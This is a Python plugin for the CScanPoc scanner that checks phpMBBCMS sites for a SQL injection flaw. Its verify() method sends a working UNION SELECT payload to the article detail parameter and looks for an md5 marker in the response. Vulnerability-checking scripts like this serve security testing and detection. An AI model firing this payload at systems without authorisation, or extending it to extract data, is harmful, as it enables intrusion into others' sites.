# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'phpMBBCMS_0000'  # 平台漏洞编号，留空
    name = 'phpMBBCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-12-25'  # 漏洞公布时间
    desc = '''
        PHPMBBCMS是一个简约的CMS，适用于学校网、商店和其他必需品的网站建设。
        PHP MBB, sebuah CMS sederhana cocok digunakan untuk keperluan misalnya, pembangunan web sekolah, toko dan keperluan lainnya secara universal.
        php MBB CMS SQL注入漏洞：/?mod=article&act=detail&id=adhan
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-61201'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'phpMBBCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3c998b73-3e53-4f1e-a6bc-df67593087c5'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/?mod=article&act=detail&id=adhan%27%20union%20select%201,2,md5(%27bb2%27),4,5%20and%20%27memang%27=%27ganteng"
            url = arg + payload
            code, head, res, errcode, final_url = hh.http(url)

            if code == 200:
                if '0c72305dbeb0ed430b79ec9fc5fe8505' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
